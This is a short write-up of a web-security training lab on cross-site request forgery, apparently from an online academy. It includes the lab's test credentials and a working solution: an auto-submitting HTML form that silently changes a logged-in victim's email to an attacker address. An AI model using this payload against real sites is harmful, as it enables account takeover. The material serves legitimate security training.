This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter 

# Solution

Upload and deliver exploit to victim
```html
<form id="autosubmit" action="https://0a9f006204e8f46785f2214f001100fc.web-security-academy.net/my-account/change-email" enctype="text/plain" method="POST">
 <input name="email" type="hidden" value="some-other-email@attacker.com" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```